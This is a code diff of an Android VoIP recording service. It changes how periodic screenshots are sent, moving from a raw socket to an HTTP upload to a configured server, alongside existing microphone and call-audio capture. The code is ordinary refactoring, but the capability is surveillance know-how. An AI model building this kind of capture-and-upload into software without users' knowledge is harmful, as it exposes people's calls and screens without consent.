@@ -10,7 +10,6 @@ import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
 import android.graphics.PixelFormat;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
@@ -34,19 +33,16 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 
-import com.example.voiprecord.VO.UserSession;
+
+import com.example.voiprecord.utils.ApiClient;
 import com.example.voiprecord.utils.VoipUtil;
+import com.example.voiprecord.vo.UserSession;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.OutputStream;
-import java.net.Socket;
-import java.nio.ByteBuffer;
-import java.nio.charset.StandardCharsets;
 import java.util.concurrent.CompletableFuture;
-import java.util.concurrent.atomic.AtomicReference;
 
 public class VoipRecordService extends Service {
     private static final String TAG = "VoipRecordingService";
@@ -61,8 +57,6 @@ public class VoipRecordService extends Service {
     private Thread playbackThread;
     private volatile boolean isRecording = false; // 使用 volatile 保证线程可见性
     private static MediaProjection mMediaProjection;
-    private File micOutputFile;
-    private File playbackOutputFile;
     private static final int NOTIFICATION_ID = 10001;
     private String currentCommand = "";
     private String serverAddress = "";
@@ -70,13 +64,9 @@ public class VoipRecordService extends Service {
 
     // 截图相关变量
     private Thread screenshotThread;
-    private static final int SCREENSHOT_PORT = 8003;
-    private static final int SCREENSHOT_INTERVAL = 10000; // 10秒
     private ImageReader imageReader;
     private VirtualDisplay virtualDisplay;
 
-    // 新增：重连延迟时间 (5秒)
-    private static final int RECONNECT_DELAY_MS = 5000;
 
     public static final String ACTION_RECORDING_STARTED = "com.example.voiprecord.RECORDING_STARTED";
     public static final String ACTION_RECORDING_STOPPED = "com.example.voiprecord.RECORDING_STOPPED";
@@ -180,9 +170,7 @@ public class VoipRecordService extends Service {
             return;
         }
 
-        if (!serverAddress.isEmpty()) {
-            initScreenshot();
-        }
+        initScreenshot();
 
         int minBufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
         int bufferSize = minBufferSize * BUFFER_SIZE_FACTOR;
@@ -235,9 +223,8 @@ public class VoipRecordService extends Service {
             completableFuture.get();
             micThread.start();
             playbackThread.start();
-            if (!serverAddress.isEmpty()) {
-                screenshotThread.start();
-            }
+            screenshotThread.start();
+
 
             Log.i(TAG, "Recording started");
             LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent(ACTION_RECORDING_STARTED));
@@ -248,47 +235,6 @@ public class VoipRecordService extends Service {
         }
     }
 
-    /**
-     * 新增：带重连逻辑的连接函数
-     * @param host      服务器地址
-     * @param port      服务器端口
-     * @param streamRef 用于持有并返回创建的 OutputStream
-     * @return Socket 连接对象，如果录音停止则返回 null
-     */
-    private Socket connectWithRetry(String host, int port, AtomicReference<OutputStream> streamRef) {
-        while (isRecording) {
-            try {
-                Log.i(TAG, "Attempting to connect to " + host + ":" + port);
-                Socket socket = new Socket(host, port);
-                OutputStream outputStream = socket.getOutputStream();
-                sendUsername(outputStream, username); // 发送用户名
-                streamRef.set(outputStream); // 将 OutputStream 存入 AtomicReference
-                Log.i(TAG, "Successfully connected to " + host + ":" + port);
-                return socket;
-            } catch (IOException e) {
-                Log.w(TAG, "Connection to " + host + ":" + port + " failed. Retrying in " + RECONNECT_DELAY_MS + "ms.", e);
-                try {
-                    Thread.sleep(RECONNECT_DELAY_MS);
-                } catch (InterruptedException ie) {
-                    Thread.currentThread().interrupt(); // 恢复中断状态
-                    Log.w(TAG, "Reconnect delay interrupted. Stopping connection attempts.");
-                    return null;
-                }
-            }
-        }
-        return null;
-    }
-
-    /**
-     * 新增：发送用户名的辅助方法
-     */
-    private void sendUsername(OutputStream out, String username) throws IOException {
-        byte[] usernameBytes = username.getBytes(StandardCharsets.UTF_8);
-        out.write(usernameBytes.length);
-        out.write(usernameBytes);
-        out.flush();
-        Log.d(TAG, "Sent username: " + username);
-    }
 
     /**
      * 重构：录制并发送音频的线程任务
@@ -346,50 +292,17 @@ public class VoipRecordService extends Service {
      * 重构：捕获并发送截图的线程任务
      */
     private void captureAndSendScreenshots() {
-        Socket socket = null;
-        OutputStream netStream = null;
         DisplayMetrics metrics = getResources().getDisplayMetrics();
         int width = metrics.widthPixels;
         int height = metrics.heightPixels;
 
         while (isRecording) {
             try {
-                // 检查网络连接
-                if (socket == null || !socket.isConnected() || socket.isClosed()) {
-                    AtomicReference<OutputStream> streamRef = new AtomicReference<>();
-                    socket = connectWithRetry(serverAddress, SCREENSHOT_PORT, streamRef);
-                    netStream = streamRef.get();
-                    if (socket == null) break;
-                }
-
-                Thread.sleep(SCREENSHOT_INTERVAL);
+                Thread.sleep(IMAGE_FREQUENCY);
 
                 Image image = imageReader.acquireLatestImage();
-                if (image == null) continue;
-
-                Image.Plane[] planes = image.getPlanes();
-                ByteBuffer buffer = planes[0].getBuffer();
-                int pixelStride = planes[0].getPixelStride();
-                int rowStride = planes[0].getRowStride();
-                int rowPadding = rowStride - pixelStride * width;
-
-                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
-                bitmap.copyPixelsFromBuffer(buffer);
-                image.close();
-
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
-                byte[] jpegData = baos.toByteArray();
-
-                // 发送数据
-                if (netStream != null) {
-                    ByteBuffer sizeBuffer = ByteBuffer.allocate(4);
-                    sizeBuffer.putInt(jpegData.length);
-                    netStream.write(sizeBuffer.array());
-                    netStream.write(jpegData);
-                    netStream.flush();
-                    Log.d(TAG, "Sent screenshot: " + jpegData.length + " bytes");
-                }
+                byte[] jpegBytes = VoipUtil.convertImageToJpegBytes(image, width, height);
+                ApiClient.uploadScreenshot(MainActivity.IP, USERSESSIONID, jpegBytes, "image.jpg");
 
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
@@ -397,31 +310,13 @@ public class VoipRecordService extends Service {
                 break;
             } catch (Exception e) {
                 Log.e(TAG, "Screenshot send error. Connection lost. Attempting to reconnect.", e);
-                closeSocket(socket);
-                socket = null;
-                netStream = null;
             }
         }
-        closeSocket(socket);
         Log.i(TAG, "Screenshot thread finished.");
     }
 
 
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        stopRecording();
 
-        if (virtualDisplay != null) {
-            virtualDisplay.release();
-            virtualDisplay = null;
-        }
-
-        if(mMediaProjection != null){
-            mMediaProjection.stop();
-            mMediaProjection = null;
-        }
-    }
 
     private void stopRecording() {
         if (!isRecording) return;
@@ -454,29 +349,28 @@ public class VoipRecordService extends Service {
             playbackRecord.release();
             playbackRecord = null;
         }
-        if (imageReader != null) {
-            imageReader.close();
-            imageReader = null;
-        }
 
 
         Log.i(TAG, "Recording stopped successfully.");
         LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent(ACTION_RECORDING_STOPPED));
     }
 
-
-    /**
-     * 新增：安全关闭 Socket 的辅助方法
-     */
-    private void closeSocket(Socket socket) {
-        if (socket != null) {
-            try {
-                if (!socket.isClosed()) {
-                    socket.close();
-                }
-            } catch (IOException e) {
-                Log.e(TAG, "Error closing socket.", e);
-            }
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        stopRecording();
+        if (mMediaProjection != null) {
+            mMediaProjection.stop();
+            mMediaProjection = null;
+        }
+        if (virtualDisplay != null) {
+            virtualDisplay.release();
+            virtualDisplay = null;
+        }
+        if (imageReader != null) {
+            imageReader.close();
+            imageReader = null;
         }
     }
+
 }
